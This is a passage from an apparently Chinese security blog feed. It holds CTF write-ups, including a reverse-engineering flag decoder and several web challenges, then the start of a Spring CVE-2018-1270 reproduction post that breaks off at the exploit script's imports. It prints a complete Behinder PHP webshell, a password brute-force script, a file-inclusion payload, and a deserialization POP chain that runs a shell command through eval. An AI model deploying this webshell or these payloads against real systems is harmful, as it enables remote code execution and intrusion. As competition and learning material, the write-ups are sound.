    <span class="token punctuation">&#125;</span>
    v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    v5 <span class="token operator">+=</span> v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    v5 <span class="token operator">^=</span> v3<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token punctuation">(</span>a2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    k <span class="token operator">=</span> v5 <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    a1<span class="token punctuation">[</span>a2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^=</span> k<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> mm <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> v9<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
    <span class="token punctuation">&#123;</span>
    <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span>
    <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span>
    <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span>
    <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x2A</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//提取的就是v9的值</span>
    <span class="token function">aaa</span><span class="token punctuation">(</span> v9<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
    std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> v9<span class="token punctuation">[</span>mm <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行得到flag<br><img src="http://img-blog.csdnimg.cn/59c9d9cd25f94cc18d4b1a10a022e762.png" alt="789"><br>flag{ ca1acd0c7d7111eeaf0296085339ce83}</p>
<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h4><p><img src="http://img-blog.csdnimg.cn/11f29ca65c4a4675add1d19f55fc2e94.png" alt="456"></p>
<p>非预期：访问&#x2F;flag就可以得到flag<br><img src="http://img-blog.csdnimg.cn/baf9550358a94843928d68e9faaa9172.png" alt="456"><br>flag{68cfa555-80e7-4cee-a85a-4c59826862b0}</p>
<h4 id="ApeCoin"><a href="#ApeCoin" class="headerlink" title="ApeCoin"></a>ApeCoin</h4><p>dirsearch扫描目录扫到压缩包文件<a href="http://www.tar.gz,同时访问/robots.txt">www.tar.gz，同时访问/robots.txt</a><br><img src="http://img-blog.csdnimg.cn/c348b9bd83774840bc6fdbf3aa0c2d15.png" alt="456"><br>访问see_see_this，发现乱码<br><img src="http://img-blog.csdnimg.cn/71b37c6310a74636a88fdaa38e014b22.png" alt="789"><br>改变编码之后如下<br><img src="http://img-blog.csdnimg.cn/90a8b04cbee044c78ec745e38ffecb9e.png" alt="789"><br>在翻找源代码时发现冰蝎php马</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">"13e40b614fcb3e19"</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$post</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'openssl'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$t</span><span class="token operator">=</span><span class="token string double-quoted-string">"base64_"</span><span class="token operator">.</span><span class="token string double-quoted-string">"decode"</span><span class="token punctuation">;</span>
        <span class="token variable">$post</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                 <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
                <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$post</span><span class="token operator">=</span><span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"AES128"</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$arr</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$params</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
    @<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>到此思路就是要找到此冰蝎马的连接密码<br>使用记事本将see_see_this文件打开发现存在多列<br><img src="http://img-blog.csdnimg.cn/ab52dce521ec4c63b129761d1a2b6e91.png" alt="456"><br>尝试零宽度字符解密<br><img src="http://img-blog.csdnimg.cn/179701ca7eee4d2db39ae5ec86ede8de.png" alt="456"><br>得到的base64进行解密<br><img src="http://img-blog.csdnimg.cn/3a594e5c5bf649bab02412ee1fcbc435.png" alt="456"><br>猜测冰蝎马密码是8位数字，上脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">def</span> <span class="token function">encrypt_number</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>
    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
target_hash <span class="token operator">=</span> <span class="token string">"13e40b614fcb3e19"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">,</span> <span class="token number">99999999</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    encrypted_number <span class="token operator">=</span> encrypt_number<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">if</span> encrypted_number <span class="token operator">==</span> target_hash<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found match: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行结果为74658263<br>然后连接冰蝎马，找到flag。<br><img src="http://img-blog.csdnimg.cn/43e4042e208a4b718f01c00e2453a8fd.png" alt="456"><br>flag{1af1bb84-4c97-4b26-a38f-826a88e204f9}</p>
<h4 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h4><p>打开网页得到如下代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//   usr/share/nginx/html </span>

<span class="token variable">$win</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'win'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$win</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token variable">$win</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//  hint.php </span>
<span class="token punctuation">&#125;</span> 
<span class="token keyword">else</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>很明显的文件包含构造playlod</p>
<blockquote>
<p>playload:<a href="http://123.56.121.61:46874/?win=php://filter/convert.base64-encode/resource=hint.php">http://123.56.121.61:46874/?win=php://filter/convert.base64-encode/resource=hint.php</a></p>
</blockquote>
<p>得到base64解码，得到如下代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">mouse</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$rice</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rice</span><span class="token operator">-></span><span class="token function">nothing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">dog</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'chance?'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ct</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$fish</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fish</span><span class="token operator">-></span><span class="token property">d</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you wrong'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">get</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$no</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$pop</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/sys|pas|read|file|ls|cat|tac|head|tail|more|less|base|echo|cp|\$|\*|\+|\^|scan|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i'</span><span class="token punctuation">,</span><span class="token variable">$pop</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you will get flag"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$pop</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try again!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>很明显的反序列化，以及浅拷贝的知识点，构造链子，在根据链子写出php代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">mouse</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$rice</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">dog</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ct</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$fish</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">get</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mouse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">fish</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">rice</span><span class="token operator">=</span><span class="token variable">$d</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"print(`nl /realflag/you_want_flag.php`);"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行得到：<br><code>O:3:&quot;dog&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;O:2:&quot;ct&quot;:1:&#123;s:4:&quot;fish&quot;;O:5:&quot;mouse&quot;:1:&#123;s:4:&quot;rice&quot;;O:3:&quot;get&quot;:1:&#123;s:3:&quot;cmd&quot;;s:40:&quot;print(`nl /realflag/you_want_flag.php`);&quot;;&#125;&#125;&#125;&#125;</code></p>
<p>构造payload<br><code>hint.php?pop=O:3:&quot;dog&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;O:2:&quot;ct&quot;:1:&#123;s:4:&quot;fish&quot;;O:5:&quot;mouse&quot;:1:&#123;s:4:&quot;rice&quot;;O:3:&quot;get&quot;:1:&#123;s:3:&quot;cmd&quot;;s:40:&quot;print(`nl /realflag/you_want_flag.php`);&quot;;&#125;&#125;&#125;&#125;</code></p>
<p>得到网页查看源码得到flag</p>
<p><img src="http://img-blog.csdnimg.cn/301029e7efed45528b0a39d9af40771e.png" alt="789"></p>
<h4 id="get-source"><a href="#get-source" class="headerlink" title="get_source"></a>get_source</h4><p>抓包发送发现X-Powered-By: PHP&#x2F;7.4.21<br>查找PHP&#x2F;7.4.21相关漏洞<br><img src="http://img-blog.csdnimg.cn/717d39f9506a4893883b9f362135902a.png" alt="456"><br>与题目相符，经过尝试发现访问index.html得到源码<br><img src="http://img-blog.csdnimg.cn/e70f4b47d9444f908f24f820fbad0768.png" alt="456"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>简单数组绕过即可</p>
<blockquote>
<p>a[]&#x3D;1&amp;b&#x3D;2&amp;pwn[]&#x3D;1</p>
</blockquote>
<p><img src="http://img-blog.csdnimg.cn/7a032be4d34741b5a94b0828818d427b.png" alt="456"></p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>spring系列漏洞复现</title>
    <url>/2023/11/21/spring%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="spring-Websocket-RCE-CVE-2018-1270"><a href="#spring-Websocket-RCE-CVE-2018-1270" class="headerlink" title="spring Websocket RCE(CVE-2018-1270)"></a>spring Websocket RCE(CVE-2018-1270)</h2><p>影响范围如⬇️：Spring Framework 4.3 - 4.3.15Spring Framework 5.0 - 5.0.5</p>
<h3 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>url&#x2F;gs-guide-websocket<br><img src="https://img-blog.csdnimg.cn/1b2beb875de4447b9b098f8d1711d1bb.png" alt="789"><br>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> json

